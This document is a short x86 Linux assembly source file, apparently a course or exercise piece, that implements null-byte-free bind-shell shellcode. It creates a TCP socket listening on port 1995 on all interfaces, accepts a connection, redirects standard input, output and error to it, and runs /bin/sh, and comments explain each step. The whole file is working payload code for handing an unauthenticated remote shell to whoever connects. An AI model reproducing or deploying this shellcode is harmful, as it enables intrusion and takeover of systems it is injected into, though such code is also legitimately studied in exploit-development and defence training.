

global _start

section .text


_start:

    xor eax, eax 
    xor ebx, ebx
    xor edx, edx
    xor esi, esi
; socket block 
xor eax, eax ; zero the eax register
push eax
mov al, 0x66 ; socketcall 102, we use al instead of eax so we don’t end up with 0x00
mov bl, 1 ;
push byte 0x1 ;pushing 1 on the stack, this is to indicate that we will be using SOCK_STREAM
push byte 0x2 ; 2 is AF_INET
mov ecx, esp ; move the stackpointer into ecx
int 0x80 ; syscall to create a socket file descriptor


; bind block 
mov esi, eax ; save the socket in esi to use it later
mov al, 0x66 ; syscall 102
mov bl, 2 ; change it to bind
push edx ; 0 to listen on all interfaces
push word 0xcb07 ; we push the hex value of 1995 for the port number
push word bx ; for AF_INET
mov ecx, esp
push byte 16 ; socket length is 16
push ecx ; pointer to the struct
push esi ; pointer to file descriptor
mov ecx, esp
int 0x80 ; syscall



; listen block
mov al, 0x66
mov bl , 4
pop edx
int 0x80


; accept block 
xor edx, edx
mov al,102
mov bl,5 ; SYS_ACCEPT
push edx ; construct argc, socket length is 0
push edx ; null socketaddr  
push esi; file descriptor
mov ecx, esp ; argument array
int 0x80


;dup2
xchg eax, ebx ; store EAX in EBX for peer socketfd from accept()
xor ecx, ecx ; zero out ecx for loop
add cl, 0x2 ; set counter to 2
dup:
mov al, 0x3f
int 0x80
dec cl
jns dup



;execve block, spawining a shell 
mov BYTE al, 11 ; execve ID
push edx ; push null for null terminator
push 0x68732f2f ; push "//sh" to the stack.
push 0x6e69622f ; push "/bin" to the stack.
mov ebx, esp ; store ESP pointer to "/bin//sh" in EBX
push edx
mov edx, esp
push ebx
mov ecx, esp
int 0x80


 


